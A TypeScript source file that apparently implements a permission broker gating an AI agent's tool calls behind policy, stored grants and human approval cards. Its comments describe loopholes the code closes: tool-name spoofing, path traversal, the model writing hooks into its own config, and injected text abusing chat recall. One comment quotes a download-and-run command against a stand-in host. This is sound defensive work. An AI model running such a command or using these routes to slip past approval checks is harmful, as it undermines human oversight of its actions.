import { randomUUID } from 'node:crypto';
import { sep } from 'node:path';
import { AGENT_PATH_ARG_KEYS, agentPolicyDenial, classifyAgentTool, isProtectedAgentPath } from './agent-tools.js';
import { BROWSER_READ_COMMANDS, browserHostDenial, normaliseHost } from './browser-hosts.js';
import { cardLine } from './card-text.js';
import {
  actionSummary,
  appKey,
  COMPUTER_BAD_ACTION_REASON,
  COMPUTER_NO_APP_REASON,
  COMPUTER_NO_WINDOW_REASON,
  COMPUTER_OFF_REASON,
  COMPUTER_UNATTENDED_REASON,
  describeApp,
  expectationOf,
  isComputerAction,
  isHighRiskApp,
  isReadAction,
  isUnattendedRun,
  parseAction,
} from './computer-apps.js';
import { canonicalHost, isLocalOrPrivateHost } from './network-hosts.js';
import { containPathIn } from './paths.js';
import type { ApprovalChoice, ApprovalRequest, LiveCallRef, ToolContext, ToolSpec } from '../ports/tool-provider.js';
import type { Grant, Store } from '../ports/store.js';
import { runsShellInSandbox, type ToolPolicy, type ToolSource } from '../types/config.js';
import { PLAN_REFUSAL } from './thread-tools.js';

export type { ApprovalChoice, ApprovalRequest } from '../ports/tool-provider.js';

export type Decision =
  | { kind: 'allow'; grantedBy: 'policy' | 'auto_read' | 'grant' | 'sandbox'; grantId?: string }
  /** `plan`: refused while the reply's plan waits. `unattended`: refused because nobody is there (computer use). */
  | { kind: 'deny'; reason: string; plan?: true; unattended?: true; code?: 'not_approved' }
  | { kind: 'ask'; request: ApprovalRequest };

export interface PermissionBrokerOptions {
  /** Hard cap on simultaneously pending approvals; the oldest is evicted past it. Default 200. */
  maxPending?: number;
  /** Tests only (`GRUNT_BROWSER_ALLOW_LOOPBACK_PORTS`): the browser may use 127.0.0.1; the proxy holds it to these ports. */
  allowLoopbackPorts?: readonly number[];
}

/** Generous: a person answers a handful of cards at a time, so reaching this means requests are leaking. */
const DEFAULT_MAX_PENDING = 200;

/** What `decide()` remembers about a pending 'ask' so `resolve()` can act on it later. */
interface PendingRequest {
  tool: ToolSpec;
  ctx: ToolContext;
  /**
   * The exact arguments the pending call was made with. Retained because a
   * `'chat'`-scope answer for a SHELL tool is persisted as a grant for that
   * one exact command string (see `resolve()`); without the args there is
   * nothing to scope such a grant to and it would have to be blanket.
   */
  args: unknown;
}

/**
 * Built-in tool names that MUST be treated as "the unsandboxed shell" for
 * grant-minting purposes even when the `ToolSpec` in hand claims some other
 * `source`.
 *
 * `resolve()`'s shell guard keys off `tool.source === 'shell'`, but grants
 * are looked up by `toolName`, so any tool that merely *calls itself*
 * `run_command` (e.g. one exposed by an MCP server) could otherwise be used
 * to mint a grant that the real shell tool then matches. Closing that on the
 * minting side is unconditional and costs nothing; the lookup side is
 * tightened separately (grants also record and match `source`).
 */
const SHELL_TOOL_NAMES = new Set(['run_command']);

/** True for the real shell tool, anything wearing its name, and every Claude Code shell-category tool (Bash, PowerShell, ...). See `SHELL_TOOL_NAMES`. */
function isShellTool(tool: ToolSpec): boolean {
  return tool.source === 'shell' || SHELL_TOOL_NAMES.has(tool.name) || (tool.source === 'agent' && classifyAgentTool(tool.name).category === 'shell');
}

/**
 * Decides whether a tool call may proceed, deferring to a stored `Grant`
 * where one applies and otherwise producing an `ApprovalRequest` for a human
 * to answer via `resolve()`.
 *
 * Three-tier model, checked in this order:
 *   1. Policy is a hard ceiling. A `source`/`risk` combination the profile's
 *      `ToolPolicy` disallows is denied outright -- no approval request is
 *      ever created for it, and no grant can override it (grants operate
 *      only within what policy already permits).
 *   2. Auto-approval is a narrow, deliberate exception to "always ask":
 *      read-risk filesystem tools (workspace-scoped) and read-risk MCP
 *      tools from a server this profile has actually enabled (tier 1 above
 *      verifies `tool.serverId` is in `policy.mcpServerIds`, so by the time
 *      this shortcut is reached the "already explicitly enabled" claim it
 *      rests on is a fact rather than an assumption -- it used to be an
 *      assumption, checked only as "at least one server is enabled
 *      somewhere") skip the prompt when
 *      `approvalMode` is `'ask_on_mutate'`. Agent (Claude Code) tools auto-approve only when
 *      their NAME classifies as file-read (never by declared risk), and agent
 *      tools need a workspace like fs/shell. Shell is carved out of this
 *      entirely and by name (`tool.source === 'shell'`), not merely by risk
 *      class, precisely so a mis-declared shell `ToolSpec` (risk `'read'`
 *      instead of `'execute'`) still can't slip through auto-approval --
 *      shell is unsandboxed and must always be at least grant- or ask-gated.
 *      The shell now has a sandboxed sibling (spec 2026-10-12-sandbox-design):
 *      `source: 'sandbox'` is `run_command` running in Grunt's WSL sandbox,
 *      which reaches only the chat's folders and allowlisted hosts. Under
 *      `ask_on_mutate` it needs no card (`grantedBy: 'sandbox'`); under
 *      `always_ask` it is grant- or ask-gated exactly like the host shell.
 *      A host outside the allowlist is `source: 'network'` and always asks:
 *      its grants are pinned to one host. Hosts are compared in one canonical
 *      spelling (`canonicalHost`, network-hosts.ts: IDNA, lowercase, IPv4
 *      normalised, no trailing dot), and a host that has none, or is
 *      `localhost` or a private/link-local address, is denied before any
 *      grant or card.
 *   3. Everything else consults stored grants (`chat` or `always` scope,
 *      constrained by path/command prefix where set) before falling back to
 *      `ask`.
 *
 * Three properties of grant handling are load-bearing enough to state here:
 *
 *   - A constraint is checked against the tool when it is stored and when it
 *     is matched. `resolve()` stores only what `alwaysConstraintFor` derives
 *     (a shell tool: exactly one command key; the network and the browser:
 *     exactly the card's own host; anything else: a `pathPrefix` or nothing)
 *     and throws on anything else. Matching needs EVERY key present to match,
 *     a `host` key matches only a network or browser call and only a grant
 *     of that same source (a browser grant never covers the sandbox's
 *     network, nor the other way round), and a shell, network or browser call
 *     never matches a constraint-less grant. Matching on the first key present let
 *     `{commandExact: 'ls', pathPrefix: '.'}` approve any command with a
 *     `path` argument.
 *   - A `pathPrefix` constraint is matched against the RESOLVED path, using
 *     the very same `containPath()` the fs tool itself will call, not
 *     against the raw model-supplied argument string. Matching the raw
 *     string let `..` walk straight out of a scoped grant: a grant on
 *     `/ws/src` matched `/ws/src/../secret.env`, which `containPath` then
 *     happily resolved to an in-workspace path, so the write proceeded under
 *     an approval the user believed was limited to `/ws/src`. Resolving both
 *     sides first means the grant and the operation cannot disagree about
 *     which file is being touched. The cost is that `decide()` now does
 *     filesystem I/O (`containPath` lstats/realpaths) rather than being
 *     pure -- deliberate: a containment decision made without consulting the
 *     filesystem is a decision about a string, not about a file.
 *   - NO grant scope is ever blanket for the shell. `resolve()` refuses an
 *     unconstrained `always` grant, and a `chat`-scope answer for a shell
 *     tool is persisted as a grant for that ONE exact command string.
 *     `run_command` has no containment of any kind by design (it is
 *     unsandboxed), so the approval gate is the only control that exists for
 *     it; "approve this command for the rest of the chat" must therefore
 *     never widen into "approve any command for the rest of the chat".
 *
 * Live artifacts (spec 2026-10-12-live-artifacts) take a separate branch,
 * before all three: a call with `ctx.live` is one a page asked for while
 * someone has it open, never a model's. It gets the policy ceiling plus
 * "MCP, read-only, artifacts on", and then only a live grant for exactly that
 * call (tool, its MCP server's id, chat, profile, artifact, call id and
 * declaration hash), made by `grantLive` when the user allowed the page in
 * the viewer. It never asks:
 * there is no turn to raise a card in, and the declaration approval was the
 * decision. It never takes the ask-on-mutate read pass or any other grant,
 * and no other call ever matches a live grant.
 *
 * The browser (`source: 'browser'`) is refused for blocked, local and private
 * sites before any card; its reads (`snapshot`, `scroll`, `close`) skip the
 * card under ask_on_mutate; its grants are always pinned to one `host`, by
 * the same rules as the sandbox's network grants (`alwaysConstraintFor`,
 * every-key matching, the canonical host) and never interchangeable with them.
 *
 * Computer use (`source: 'computer'`) is refused outright in an unattended
 * run; its looking actions (`screenshot`, `cursor_position`, `wait`) skip the
 * card in both modes, by exact action name; every other action is about one
 * app, named by its key (`appKey`: the program path the shell resolved,
 * compared with `===` and never repaired or folded here), and a call with no
 * valid key is refused. Its grants are always pinned to one key. An app that
 * isn't provably ordinary (`isHighRiskApp`: a shell, Explorer, a browser, or
 * anything unknown) is asked about every time: no grant is stored for it and
 * none is matched. The card's line names the app from the key alone. Its
 * grants follow the same rules as the host-keyed ones: an "always" is
 * exactly `{ app }`, the card's own (`alwaysConstraintFor`), every key must
 * match, and an `app` grant only ever covers a computer call. In Plan mode
 * every computer action is refused, the looks included (`allowedWhilePlanning`).
 */
export class PermissionBroker {
  private readonly pending = new Map<string, PendingRequest>();
  private readonly evictListeners = new Set<(requestId: string) => void>();
  private readonly maxPending: number;
  private readonly allowLoopbackPorts: readonly number[];

  constructor(
    private readonly store: Store,
    options: PermissionBrokerOptions = {}
  ) {
    this.maxPending = options.maxPending ?? DEFAULT_MAX_PENDING;
    this.allowLoopbackPorts = options.allowLoopbackPorts ?? [];
  }

  /** How many approval requests are currently waiting for an answer. */
  get pendingCount(): number {
    return this.pending.size;
  }

  /** True while `requestId` is still waiting for an answer (not resolved, discarded or evicted). */
  hasPending(requestId: string): boolean {
    return this.pending.has(requestId);
  }

  /**
   * Subscribes to the BACKSTOP evicting a request (see `enforceBound`). The
   * eviction is a safety net for a request whose owner never ended it; whoever
   * is waiting on it (GruntToolProvider) must settle that wait as a denial.
   * Never fired by `resolve()`/`discard()`, which are the callers' own doing.
   */
  onEvict(cb: (requestId: string) => void): () => void {
    this.evictListeners.add(cb);
    return () => this.evictListeners.delete(cb);
  }

  decide(tool: ToolSpec, args: unknown, policy: ToolPolicy, ctx: ToolContext): Decision {
    if (ctx.live) return this.decideLive(tool, policy, ctx, ctx.live);

    const policyDenial = checkPolicy(tool, policy);
    if (policyDenial) return { kind: 'deny', reason: policyDenial };

    // Plan mode (spec 2026-10-12-thread-cards-design §4): until the user
    // approves this reply's plan, anything that could change something is
    // refused, with no card. This only adds refusals: an allowed call still
    // goes on to its grants or card below.
    if (ctx.plan && !ctx.plan.approved && !allowedWhilePlanning(tool, args)) {
      return { kind: 'deny', reason: PLAN_REFUSAL, plan: true };
    }

    // fs/shell tools act ON a workspace; without one configured for this
    // chat there is nothing for them to legitimately operate on (shell's
    // cwd is forced to workspace_root -- task 24 -- agent (Claude Code) tools run in it too, and every fs tool call
    // goes through containPath(workspaceRoot, ...), which itself denies a
    // null root). mcp tools carry no such requirement, and neither do Claude
    // Code's web tools, which reach nothing local: a clean Claude Code chat
    // (spec 2026-10-11-claude-code-clean-chat-and-mcp-design) may use them.
    // Claude Code's internal tools (TodoWrite, AskUserQuestion) touch nothing
    // local either, so a clean chat may use them.
    const agentCategory = tool.source === 'agent' ? classifyAgentTool(tool.name).category : null;
    const needsWorkspace =
      tool.source === 'fs' ||
      tool.source === 'shell' ||
      tool.source === 'sandbox' ||
      (agentCategory !== null && agentCategory !== 'web' && agentCategory !== 'internal');
    if (needsWorkspace && !ctx.workspaceRoot) {
      return {
        kind: 'deny',
        reason: `"${tool.name}" requires a workspace root, and none is configured for this chat.`,
      };
    }

    // The sandbox never reaches this machine or the local network, whatever
    // a grant says, and a host with no canonical spelling can't be compared
    // with one: both are refused before the grants are looked at.
    if (tool.source === 'network') {
      const refusal = networkHostRefusal(args);
      if (refusal) return { kind: 'deny', reason: refusal };
    }

    // A write into one of the chat's read-only extra folders is refused here,
    // before any card (spec 2026-10-07-extra-folders). A path in no folder at
    // all is left to the tool, which refuses it as it always has.
    if (tool.source === 'fs' && tool.risk === 'mutate') {
      const path = stringField(args, 'path');
      if (path !== null && inReadOnlyFolder(ctx, path)) {
        return { kind: 'deny', reason: `"${tool.name}" can't change ${path}: it's in a read-only folder.` };
      }
    }

    // The browser (spec 2026-10-12-model-browser-design): a call is about one
    // website, the `host` its describeCall worked out (a host the model sent
    // is thrown away before this). A blocked, local or private site is
    // refused before any card, and so is a call that names no site at all.
    if (tool.source === 'browser') {
      const denial = browserHostDenial(stringField(args, 'host'), policy, { allowLoopbackPorts: this.allowLoopbackPorts });
      if (denial) return { kind: 'deny', reason: denial };
      // Reading the open page needs no card under "ask on mutate". By command
      // name, never by declared risk (as for Claude Code's file reads).
      if (policy.approvalMode === 'ask_on_mutate' && BROWSER_READ_COMMANDS.has(stringField(args, 'command') ?? '')) {
        return { kind: 'allow', grantedBy: 'auto_read' };
      }
    }

    // Claude Code's bookkeeping tools (TodoWrite, Task/Agent, AskUserQuestion)
    // have no side effects of their own; a subagent's real tool calls come
    // back through here individually.
    if (tool.source === 'agent' && classifyAgentTool(tool.name).category === 'internal') {
      return { kind: 'allow', grantedBy: 'policy' };
    }

    // Artifacts (Deck #896) change nothing outside Grunt and keep every
    // version, so they never need a card; the profile's switch (checked
    // above) is how they're turned off. Only the source says a call is
    // Grunt's: never a Claude Code tool's name, which any MCP server can take
    // (the Claude Code engine marks its own server's call itself).
    if (tool.source === 'artifact') {
      return { kind: 'allow', grantedBy: 'policy' };
    }

    // A sandboxed command (spec 2026-10-12-sandbox-design) can reach only the
    // chat's folders and allowlisted hosts, so under ask-on-changes it needs
    // no card, which is what lets unattended runs use the shell. Under
    // always-ask it falls through to the grants and a card like the host
    // shell. Its network requests (source 'network') never take this pass.
    if (tool.source === 'sandbox' && policy.approvalMode === 'ask_on_mutate') {
      return { kind: 'allow', grantedBy: 'sandbox' };
    }

    // Thread tools (spec 2026-10-12-thread-cards-design): a checklist, a
    // question or a plan for the user. They change nothing, so they never
    // need a card; they are still audited like every call. A sub-agent gets
    // none of them: it can't ask the user anything, a plan it proposed would
    // open its parent's plan gate, and the checklist is the reply's own.
    // SubagentRunner never offers them; this refuses one that arrives anyway.
    if (tool.source === 'thread') {
      return ctx.subagent ? { kind: 'deny', reason: SUBAGENT_THREAD_REFUSAL } : { kind: 'allow', grantedBy: 'policy' };
    }

    // Sub-agents (spec 2026-10-12-api-subagents-design): the call itself has
    // no effect; every tool call the sub-agent makes comes back through here
    // on its own, under a policy never wider than this one. One level only.
    if (tool.source === 'subagent') {
      return ctx.subagent ? { kind: 'deny', reason: "A sub-agent can't start another sub-agent." } : { kind: 'allow', grantedBy: 'policy' };
    }

    // Computer use (spec 2026-10-12-computer-use-design §1). Never in a run
    // nobody is watching, whatever grants exist: checked before them.
    // Looking (screenshot, cursor position, wait) needs no card in either
    // mode -- the shell's own start dialog was the consent to see the screen
    // -- and goes by the action's NAME, never the declared risk. Anything
    // else needs a grant for the app the tool's describeCall resolved, or a
    // card; with no app at all it is refused (fail closed).
    if (tool.source === 'computer') {
      // Never a sub-agent's, whatever policy it came with (its own policy has
      // computer use off: SUBAGENT_POLICY_RULES). Nobody watches a sub-agent's
      // screen, and its start would put the native dialog up for a job the
      // user never asked to watch. As for the thread and subagent tools.
      if (ctx.subagent) return { kind: 'deny', reason: SUBAGENT_COMPUTER_REFUSAL };
      // Fail closed: only a plain `false`, or nothing at all, says someone is
      // there. Any other value (a string, a number, null) counts as unattended.
      if (isUnattendedRun(ctx)) return { kind: 'deny', reason: COMPUTER_UNATTENDED_REASON, unattended: true };
      const action = stringField(args, 'action');
      // Exactly one of the known names, as a string: anything else (another
      // case, an array, a missing action) is refused, never treated as a look.
      if (!isComputerAction(action)) return { kind: 'deny', reason: `"${cardLine(action, 40)}" isn't a computer action Grunt can do.` };
      // The whole action must be one Grunt would carry out, within every cap
      // (`parseAction`): a readable coordinate, a key combination that stays
      // in the app, typed text with no control characters, a wait that is a
      // number. The tool's describeCall refuses these first, with a fuller
      // reason; this is the backstop, so neither a look nor a grant ever
      // covers one.
      // `reserved: []`: nothing to hold back here; the tool checked a key against the shell's real list.
      const valid = parseAction(args, { reserved: [] }).ok;
      if (isReadAction(action)) return valid ? { kind: 'allow', grantedBy: 'policy' } : { kind: 'deny', reason: COMPUTER_BAD_ACTION_REASON };
      // The app's key must be valid as it stands. One that isn't is no app.
      if (appKey(rawField(args, 'app')) === null) return { kind: 'deny', reason: COMPUTER_NO_APP_REASON };
      // A card and a grant are about one window of that app: without the
      // window, pid and start time the shell checks before acting, the call
      // could land anywhere, so it is refused.
      if (expectationOf(args) === null) return { kind: 'deny', reason: COMPUTER_NO_WINDOW_REASON };
      if (!valid) return { kind: 'deny', reason: COMPUTER_BAD_ACTION_REASON };
    }

    // Recall (spec 2026-10-09-recall-design) gets no shortcut: it reads the
    // user's OTHER chats, so text injected into this one could use it to
    // reach them. It falls through to the grants, and the card's "for this
    // chat" covers the rest of the chat. It never takes the ask-on-mutate
    // read pass below, which only fs, agent and mcp tools get.

    if (policy.approvalMode === 'ask_on_mutate' && tool.risk === 'read') {
      if (tool.source === 'fs') return { kind: 'allow', grantedBy: 'auto_read' };
      // Name-based, not declared-risk-based: only Claude Code's known file-read tools.
      if (tool.source === 'agent' && classifyAgentTool(tool.name).category === 'file-read') return { kind: 'allow', grantedBy: 'auto_read' };
      // An mcp server was already explicitly enabled by the user (a policy
      // action distinct from any single tool call), so a READ-risk call
      // against it is treated as pre-authorised by that policy decision --
      // distinct from auto_read, which is specifically the workspace-scoped
      // filesystem shortcut. Mutate/execute-risk mcp tools get no such
      // shortcut and fall through to the grant/ask path below like any
      // other mutating call.
      if (tool.source === 'mcp') return { kind: 'allow', grantedBy: 'policy' };
    }

    // A Claude Code write to its own config (see isProtectedAgentPath) always
    // gets a card: no stored grant, however scoped, may cover it. Nor may one
    // cover computer use of a high-risk app.
    const grant = isProtectedAgentWrite(tool, args) || isHighRiskComputerCall(tool, args) ? null : this.findMatchingGrant(tool, args, ctx);
    if (grant) {
      // A 'once' grant authorises exactly one call; consume it immediately
      // so a second identical call is asked about again rather than reusing
      // it silently.
      if (grant.scope === 'once') this.store.grants.delete(grant.id);
      return { kind: 'allow', grantedBy: 'grant', grantId: grant.id };
    }

    const request: ApprovalRequest = {
      id: randomUUID(),
      chatId: ctx.chatId,
      messageId: ctx.messageId,
      toolName: tool.name,
      risk: tool.risk,
      source: tool.source,
      args,
      summary:
        tool.source === 'recall'
          ? this.recallSummary(args)
          : tool.source === 'network'
            ? networkSummary(args)
            : tool.source === 'browser'
              ? browserSummary(args)
              : tool.source === 'computer'
                ? computerSummary(args)
                : summarize(tool, args),
      ...(ctx.subagent ? { subagent: ctx.subagent } : {}),
    };
    this.enforceBound(ctx.messageId);
    this.pending.set(request.id, { tool, ctx, args });
    return { kind: 'ask', request };
  }

  /** Why `tool` can't feed a live artifact under `policy`, or null when it can. Also what the viewer shows for an unavailable call. */
  liveIneligibility(tool: ToolSpec, policy: ToolPolicy): string | null {
    const denial = checkPolicy(tool, policy);
    if (denial) return denial;
    if (policy.artifacts === false) return 'Artifacts are turned off for this profile.';
    if (tool.source !== 'mcp') return 'Only MCP tools can feed a live artifact.';
    if (tool.risk !== 'read') return `"${tool.name}" can change things; live artifacts can only use tools their server marks read-only.`;
    return null;
  }

  /**
   * The live grant for exactly this call in this chat under this profile, or
   * null. The grant's server id must be the tool's current server's: a server
   * renamed or replaced into the tool's name never inherits it. A grant made
   * before grants carried a server id has none, so it never matches.
   */
  liveGrant(tool: ToolSpec, ctx: { chatId: string; profileId: string; live: LiveCallRef }): Grant | null {
    const now = Date.now();
    for (const grant of this.store.grants.list(ctx.chatId)) {
      const live = grant.constraint?.live;
      if (!live || grant.toolName !== tool.name || grant.source !== 'mcp' || grant.chatId !== ctx.chatId || grant.profileId !== ctx.profileId) continue;
      if (grant.expiresAt !== null && grant.expiresAt <= now) continue;
      if (typeof live.serverId !== 'string' || typeof ctx.live.serverId !== 'string') continue;
      if (live.artifactId === ctx.live.artifactId && live.callId === ctx.live.callId && live.hash === ctx.live.hash && live.serverId === ctx.live.serverId) return grant;
    }
    return null;
  }

  private decideLive(tool: ToolSpec, policy: ToolPolicy, ctx: ToolContext, live: LiveCallRef): Decision {
    const why = this.liveIneligibility(tool, policy);
    if (why) return { kind: 'deny', reason: why };
    const grant = this.liveGrant(tool, { chatId: ctx.chatId, profileId: ctx.profileId, live });
    if (grant) return { kind: 'allow', grantedBy: 'grant', grantId: grant.id };
    return { kind: 'deny', code: 'not_approved', reason: "You haven't allowed this live artifact's calls on this machine." };
  }

  /**
   * The user allowed a live page's calls in the viewer: one chat grant per
   * call, bound to its declaration's hash and to the id of the MCP server its
   * tool comes from now. Every call must be eligible, or none is granted (an
   * Error names the first that isn't), so this can never mint a grant the
   * live branch would then deny. A call that already has its grant (same
   * server too) is skipped. Returns the grants it made.
   */
  grantLive(input: { chatId: string; profileId: string; artifactId: string; policy: ToolPolicy; calls: { tool: ToolSpec; callId: string; hash: string; serverId: string }[] }): Grant[] {
    for (const call of input.calls) {
      const why = this.liveIneligibility(call.tool, input.policy);
      if (why) throw new Error(`Live call "${call.callId}" can't be allowed: ${why}`);
    }
    const made: Grant[] = [];
    for (const call of input.calls) {
      const live = { artifactId: input.artifactId, callId: call.callId, hash: call.hash, serverId: call.serverId };
      if (this.liveGrant(call.tool, { chatId: input.chatId, profileId: input.profileId, live })) continue;
      made.push(
        this.store.grants.create({
          id: randomUUID(),
          chatId: input.chatId,
          profileId: input.profileId,
          toolName: call.tool.name,
          source: 'mcp',
          scope: 'chat',
          constraint: { live },
          expiresAt: null,
        })
      );
    }
    return made;
  }

  /** Stop live data: deletes the chat's live grants for that artifact. Returns how many. */
  revokeLive(chatId: string, artifactId: string): number {
    let removed = 0;
    for (const grant of this.store.grants.list(chatId)) {
      if (grant.constraint?.live?.artifactId !== artifactId) continue;
      this.store.grants.delete(grant.id);
      removed += 1;
    }
    return removed;
  }

  /**
   * Records the human's answer to a previously-issued `ApprovalRequest`.
   * Persists a durable `Grant` for `'chat'`/`'always'` choices so a later
   * `decide()` call for a matching tool call finds it; `'deny'`/`'once'`
   * persist nothing (`'once'` authorises only the specific in-flight call --
   * actually resuming that call is the caller's responsibility, out of
   * scope here; see task 26).
   *
   * Each request id may be resolved exactly once: it is removed from the
   * pending set immediately, so a duplicate or unknown id throws rather than
   * silently no-op-ing (a UI double-submit or a stale id must surface as an
   * error, not be swallowed).
   */
  resolve(requestId: string, choice: ApprovalChoice): void {
    const pending = this.pending.get(requestId);
    if (!pending) {
      throw new Error(`PermissionBroker.resolve: unknown or already-resolved approval request "${requestId}".`);
    }
    this.pending.delete(requestId);

    // Only grantLive makes live grants (spec 2026-10-12-live-artifacts). The
    // route already drops unknown constraint keys; this is defence in depth.
    if (choice.choice === 'always' && choice.constraint?.live !== undefined) {
      throw new Error('Refusing to create an "always" grant with a live constraint: only PermissionBroker.grantLive makes live grants.');
    }

    if (choice.choice === 'deny' || choice.choice === 'once') return;

    // Fail closed: Grunt cannot know what an unrecognised Claude Code tool does,
    // so it never pre-authorises future calls. 'chat'/'always' act like 'once'.
    if (pending.tool.source === 'agent' && classifyAgentTool(pending.tool.name).category === 'other') return;

    // Likewise for a Claude Code write to its own config files. A grant on
    // `.claude/settings.local.json` (or a `pathPrefix` covering `.claude/`,
    // `.mcp.json` or a CLAUDE.md) would let the model write a hook, a skill's
    // inline shell or an MCP server command that Claude Code then runs on a
    // later turn with no Bash card -- a file grant turned into a shell grant.
    // 'chat'/'always' act like 'once', and decide() never matches a grant for
    // such a write either.
    if (isProtectedAgentWrite(pending.tool, pending.args)) return;

    // Computer use of an app that isn't provably ordinary (a shell, Explorer,
    // a browser, anything unknown) is only ever allowed once. Its card offers
    // nothing else, so a 'chat' or 'always' answer for one is refused out
    // loud and stores nothing; decide() never matches a grant for one either.
    if (pending.tool.source === 'computer') {
      const app = appForGrant(pending);
      if (isHighRiskApp(pending.args)) {
        throw new Error(`Refusing to store a grant for computer use of ${cardLine(describeApp(app)?.name, 80)}: Grunt asks every time for this app.`);
      }
    }

    if (choice.choice === 'chat') {
      // A 'chat' answer for the shell is NOT a blanket grant for the rest of
      // the chat. `{choice:'chat'}` carries no constraint of its own (the UI
      // offers no field for one), so approving `echo hi` this way used to
      // authorise `curl http://evil.example/x.sh | sh` for the remainder of
      // the chat -- the entire approval gate, and therefore the entire
      // control surface for an unsandboxed shell, gone in one click. The
      // grant is instead pinned to the exact command string that was
      // approved; anything else asks again.
      const constraint = isShellTool(pending.tool)
        ? { commandExact: exactCommandForGrant(pending) }
        : isHostKeyed(pending.tool.source)
          ? { host: hostForGrant(pending) }
          : pending.tool.source === 'computer'
            ? { app: appForGrant(pending) }
            : null;
      this.store.grants.create({
        id: randomUUID(),
        chatId: pending.ctx.chatId,
        profileId: pending.ctx.profileId,
        toolName: pending.tool.name,
        source: pending.tool.source,
        scope: 'chat',
        constraint,
        expiresAt: null,
      });
      return;
    }

    // choice.choice === 'always': global scope (chatId: null), so it must
    // never be a blanket grant for shell -- shell is unsandboxed, and an
    // unconstrained "always" grant for it would let every future command in
    // every future chat run with no further approval. This check is the
    // code-level enforcement of that project-wide rule; it is NOT redundant
    // with "shell never auto-approves" above, which only guards decide()'s
    // own shortcut and says nothing about a grant a human explicitly created.
    //
    // `isShellTool` rather than `source === 'shell'`: a tool that merely
    // calls itself `run_command` must not be able to mint the very grant the
    // real shell tool is forbidden from having (see SHELL_TOOL_NAMES).
    // A network grant is for one host, like a shell grant is for one command:
    // "always let the sandbox reach anything" is never one click. A browser
    // grant is the same: the one site the card named, never blanket and never
    // a different site than the one the person was shown. No constraint is
    // stored as sent: see alwaysConstraintFor. Likewise for computer use: the
    // grant is for the one app the card named (its key, as the tool's
    // describeCall worked it out), never blanket and never another app.
    const constraint = alwaysConstraintFor(pending, choice.constraint);

    this.store.grants.create({
      id: randomUUID(),
      chatId: null,
      profileId: pending.ctx.profileId,
      toolName: pending.tool.name,
      source: pending.tool.source,
      scope: 'always',
      constraint,
      expiresAt: null,
    });
  }

  /** What a recall call will look at, for its card: the query, or the chat's title, or the project. */
  private recallSummary(args: unknown): string {
    const command = stringField(args, 'command');
    const chatId = stringField(args, 'chatId');
    const project = stringField(args, 'project');
    if (command === 'search') return `Search past chats for "${stringField(args, 'query') ?? ''}"`;
    if (command === 'read' && chatId !== null) {
      const title = this.store.chats.get(chatId)?.title;
      return title !== undefined ? `Read the chat "${title}"` : `Read a chat (${chatId})`;
    }
    if (command === 'read' && project !== null) return `Read the project "${project}"`;
    return `recall: ${command ?? '?'}`;
  }

  /**
   * Drops a pending request created by `decide()` without answering it: no
   * grant, no event. Used when auto mode hands the call to Claude Code's
   * classifier instead of a card (GruntToolProvider.requestApproval). An
   * unknown or already-settled id is a no-op, never an error.
   */
  discard(requestId: string): void {
    this.pending.delete(requestId);
  }

  /**
   * Defence in depth for the pending map. Every request is meant to leave it
   * through `resolve()` or `discard()` (the provider does both when a turn or
   * variant ends), so this only fires when some path was missed. Before each
   * new request is stored it (1) drops requests whose turn signal has aborted
   * -- their turn is gone, nobody can answer them -- and (2) if the map is
   * still at `maxPending`, evicts the oldest ones (Map keeps insertion order)
   * to make room. Each eviction is logged with `console.warn` so a leak path
   * stays visible instead of quietly masked, and reported to `onEvict`
   * listeners so the waiting call is settled as a DENIAL. An evicted request
   * is simply unknown afterwards: `resolve()` throws for it, so it can never
   * become an allow or mint a grant.
   */
  private enforceBound(messageId: string): void {
    for (const [id, p] of this.pending) {
      if (p.ctx.signal.aborted) this.evict(id, 'its turn was aborted but it was never discarded -- a lifecycle path missed it');
    }
    while (this.pending.size >= this.maxPending) {
      // Evict from the message that is asking first, so one runaway step
      // cannot push out a live card belonging to another chat or variant.
      let victim: string | undefined;
      for (const [id, p] of this.pending) {
        if (p.ctx.messageId === messageId) {
          victim = id;
          break;
        }
      }
      const own = victim !== undefined;
      victim ??= this.pending.keys().next().value;
      if (victim === undefined) break;
      this.evict(
        victim,
        own
          ? `message "${messageId}" alone has raised too many approvals (cap ${this.maxPending}); dropping its oldest`
          : `${this.maxPending} approvals are pending across all chats; dropping the oldest`
      );
    }
  }

  private evict(requestId: string, why: string): void {
    this.pending.delete(requestId);
    console.warn(`[PermissionBroker] backstop dropped pending approval "${requestId}": ${why}.`);
    for (const cb of this.evictListeners) {
      try {
        cb(requestId);
      } catch (err) {
        console.error('[PermissionBroker] an evict listener threw:', err);
      }
    }
  }

  private findMatchingGrant(tool: ToolSpec, args: unknown, ctx: ToolContext): Grant | null {
    const now = Date.now();
    for (const grant of this.store.grants.list()) {
      if (grant.toolName !== tool.name) continue;
      // Name AND source, never name alone: an MCP server can call its tool
      // anything it likes, including `run_command`. Keying on the name alone
      // let such a tool obtain a grant that the real, unsandboxed shell tool
      // then matched in a different chat -- exactly the blanket always-grant
      // the shell guard in resolve() exists to prevent, through a side door.
      if (grant.source !== tool.source) continue;
      if (grant.expiresAt !== null && grant.expiresAt <= now) continue;
      // null chatId = a global ('always') grant; a non-null chatId must
      // match this exact chat ('chat'-scope grants, or a scoped 'once').
      if (grant.chatId !== null && grant.chatId !== ctx.chatId) continue;
      // Likewise per profile: tool permission is a profile-level property
      // ("shell is default-deny PER PROFILE with per-command approval"), so
      // a grant made while running a locked-down profile must not apply when
      // the same chat is re-run under a permissive one. null = a grant that
      // was never profile-stamped (see Grant.profileId) and matches any.
      if (grant.profileId !== null && grant.profileId !== ctx.profileId) continue;
      if (!grantConstraintMatches(grant, tool, args, ctx)) continue;
      return grant;
    }
    return null;
  }
}

// ---------------------------------------------------------------------------

/**
 * What an unattended (scheduled) run's tool call gets instead of a card
 * (spec 2026-10-12-scheduled-tasks-design §2): the model reads it, so it says
 * what happened and how to let the call run next time.
 */
/** A thread tool (question, plan, checklist) called from inside a sub-agent. */
/** A computer call made from inside a sub-agent. */
export const SUBAGENT_COMPUTER_REFUSAL = "A sub-agent can't use the computer. Say in your answer what needs doing on screen, and the reply that started you can do it.";

export const SUBAGENT_THREAD_REFUSAL = "A sub-agent can't ask the user, propose a plan or keep the reply's checklist. Put what you need to say in your answer.";

export const UNATTENDED_REASON =
  'Nobody is watching this scheduled run, so this tool call needed an approval that nobody can give. It did not run. ' +
  'To let it run unattended, allow it ahead of time with an Always grant. Shell commands run unattended in the sandbox ' +
  '(a profile whose shell runs there, with "Ask on changes"); a host the sandbox needs must be on that profile\'s list or have an Always grant. ' +
  'The browser needs an Always grant for each website it opens or acts on; with "Ask on changes" it can read a page that is already open without one.';

/**
 * Whether, in Claude Code auto mode, a call the broker would ask about may go
